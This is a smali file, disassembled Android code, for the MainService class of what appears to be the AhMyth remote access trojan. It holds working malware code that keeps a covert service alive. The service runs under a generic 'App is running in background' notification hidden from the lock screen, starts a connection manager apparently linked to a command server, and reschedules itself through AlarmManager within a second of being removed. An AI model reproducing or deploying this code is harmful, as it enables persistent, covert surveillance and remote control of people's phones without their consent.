.class public Lahmyth/mine/king/ahmyth/MainService;
.super Landroid/app/Service;
.source "MainService.java"


# static fields
.field static final synthetic $assertionsDisabled:Z

.field private static contextOfApplication:Landroid/content/Context;


# direct methods
.method static constructor <clinit>()V
    .locals 0

    return-void
.end method

.method public constructor <init>()V
    .locals 0

    .line 21
    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    return-void
.end method

.method private static findContext()V
    .locals 3
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/lang/Exception;
        }
    .end annotation

    :try_start_0
    const-string v0, "android.app.ActivityThread"

    .line 27
    invoke-static {v0}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v0
    :try_end_0
    .catch Ljava/lang/ClassNotFoundException; {:try_start_0 .. :try_end_0} :catch_0

    const/4 v1, 0x0

    new-array v1, v1, [Ljava/lang/Class;

    const-string v2, "currentApplication"

    .line 33
    invoke-virtual {v0, v2, v1}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v0

    const/4 v1, 0x0

    .line 34
    move-object v2, v1

    check-cast v2, [Ljava/lang/Object;

    invoke-virtual {v0, v1, v2}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/content/Context;

    if-nez v1, :cond_0

    .line 37
    new-instance v1, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v2

    invoke-direct {v1, v2}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    .line 38
    new-instance v2, Lahmyth/mine/king/ahmyth/MainService$1;

    invoke-direct {v2, v0}, Lahmyth/mine/king/ahmyth/MainService$1;-><init>(Ljava/lang/reflect/Method;)V

    invoke-virtual {v1, v2}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z

    goto :goto_0

    .line 50
    :cond_0
    invoke-static {v1}, Lahmyth/mine/king/ahmyth/MainService;->startService(Landroid/content/Context;)V

    :catch_0
    :goto_0
    return-void
.end method

.method public static getContextOfApplication()Landroid/content/Context;
    .locals 1

    .line 100
    sget-object v0, Lahmyth/mine/king/ahmyth/MainService;->contextOfApplication:Landroid/content/Context;

    return-object v0
.end method

.method public static start()V
    .locals 0

    .line 57
    :try_start_0
    invoke-static {}, Lahmyth/mine/king/ahmyth/MainService;->findContext()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    return-void
.end method

.method private startMyOwnForeground()V
    .locals 4

    .line 127
    new-instance v0, Landroid/app/NotificationChannel;

    const-string v1, "com.play.service.techno"

    const-string v2, "My Background Service"

    const/4 v3, 0x0

    invoke-direct {v0, v1, v2, v3}, Landroid/app/NotificationChannel;-><init>(Ljava/lang/String;Ljava/lang/CharSequence;I)V

    const v2, -0xffff01

    .line 128
    invoke-virtual {v0, v2}, Landroid/app/NotificationChannel;->setLightColor(I)V

    .line 129
    invoke-virtual {v0, v3}, Landroid/app/NotificationChannel;->setLockscreenVisibility(I)V

    const-string v2, "notification"

    .line 130
    invoke-virtual {p0, v2}, Lahmyth/mine/king/ahmyth/MainService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Landroid/app/NotificationManager;

    .line 132
    invoke-virtual {v2, v0}, Landroid/app/NotificationManager;->createNotificationChannel(Landroid/app/NotificationChannel;)V

    .line 134
    new-instance v0, Landroid/support/v4/app/NotificationCompat$Builder;

    invoke-direct {v0, p0, v1}, Landroid/support/v4/app/NotificationCompat$Builder;-><init>(Landroid/content/Context;Ljava/lang/String;)V

    const/4 v1, 0x1

    .line 135
    invoke-virtual {v0, v1}, Landroid/support/v4/app/NotificationCompat$Builder;->setOngoing(Z)Landroid/support/v4/app/NotificationCompat$Builder;

    move-result-object v0

    const-string v2, "App is running in background"

    .line 136
    invoke-virtual {v0, v2}, Landroid/support/v4/app/NotificationCompat$Builder;->setContentTitle(Ljava/lang/CharSequence;)Landroid/support/v4/app/NotificationCompat$Builder;

    move-result-object v0

    .line 137
    invoke-virtual {v0, v1}, Landroid/support/v4/app/NotificationCompat$Builder;->setPriority(I)Landroid/support/v4/app/NotificationCompat$Builder;

    move-result-object v0

    const-string v2, "service"

    .line 138
    invoke-virtual {v0, v2}, Landroid/support/v4/app/NotificationCompat$Builder;->setCategory(Ljava/lang/String;)Landroid/support/v4/app/NotificationCompat$Builder;

    move-result-object v0

    .line 139
    invoke-virtual {v0}, Landroid/support/v4/app/NotificationCompat$Builder;->build()Landroid/app/Notification;

    move-result-object v0

    .line 140
    invoke-virtual {p0, v1, v0}, Lahmyth/mine/king/ahmyth/MainService;->startForeground(ILandroid/app/Notification;)V

    return-void
.end method

.method public static startService(Landroid/content/Context;)V
    .locals 2

    .line 63
    new-instance v0, Landroid/content/Intent;

    const-class v1, Lahmyth/mine/king/ahmyth/MainService;

    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p0, v0}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    return-void
.end method


# virtual methods
.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 0

    const/4 p1, 0x0

    return-object p1
.end method

.method public onDestroy()V
    .locals 0

    .line 94
    invoke-super {p0}, Landroid/app/Service;->onDestroy()V

    return-void
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 0

    .line 80
    sget p1, Landroid/os/Build$VERSION;->SDK_INT:I

    const/4 p2, 0x1

    const/16 p3, 0x1a

    if-lt p1, p3, :cond_0

    .line 81
    invoke-direct {p0}, Lahmyth/mine/king/ahmyth/MainService;->startMyOwnForeground()V

    goto :goto_0

    .line 84
    :cond_0
    new-instance p1, Landroid/app/Notification;

    invoke-direct {p1}, Landroid/app/Notification;-><init>()V

    invoke-virtual {p0, p2, p1}, Lahmyth/mine/king/ahmyth/MainService;->startForeground(ILandroid/app/Notification;)V

    .line 87
    :goto_0
    sput-object p0, Lahmyth/mine/king/ahmyth/MainService;->contextOfApplication:Landroid/content/Context;

    .line 88
    invoke-static {p0}, Lahmyth/mine/king/ahmyth/ConnectionManager;->startAsync(Landroid/content/Context;)V

    return p2
.end method

.method public onTaskRemoved(Landroid/content/Intent;)V
    .locals 4

    .line 105
    invoke-super {p0, p1}, Landroid/app/Service;->onTaskRemoved(Landroid/content/Intent;)V

    .line 110
    invoke-virtual {p0}, Lahmyth/mine/king/ahmyth/MainService;->getApplicationContext()Landroid/content/Context;

    move-result-object p1

    new-instance v0, Landroid/content/Intent;

    .line 112
    invoke-virtual {p0}, Lahmyth/mine/king/ahmyth/MainService;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    const-class v2, Lahmyth/mine/king/ahmyth/MainService;

    invoke-direct {v0, v1, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const/16 v1, 0x3e9

    const/high16 v2, 0x40000000    # 2.0f

    .line 109
    invoke-static {p1, v1, v0, v2}, Landroid/app/PendingIntent;->getService(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object p1

    const-string v0, "alarm"

    .line 115
    invoke-virtual {p0, v0}, Lahmyth/mine/king/ahmyth/MainService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/AlarmManager;

    const/4 v1, 0x2

    const-wide/16 v2, 0x3e8

    .line 116
    invoke-virtual {v0, v1, v2, v3, p1}, Landroid/app/AlarmManager;->set(IJLandroid/app/PendingIntent;)V

    return-void
.end method
